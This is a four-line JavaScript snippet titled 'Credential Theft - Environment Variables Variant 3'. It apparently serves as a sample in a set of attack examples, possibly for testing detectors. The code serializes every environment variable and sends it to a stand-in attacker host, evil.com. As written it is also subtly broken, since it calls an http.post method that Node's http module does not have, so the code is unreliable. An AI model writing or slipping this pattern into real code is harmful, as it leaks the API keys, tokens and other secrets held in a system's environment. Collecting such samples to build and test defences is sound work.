// Credential Theft - Environment Variables Variant 3
const http = require('http');
const env = JSON.stringify(process.env);
http.post('http://evil.com/steal', { body: env });
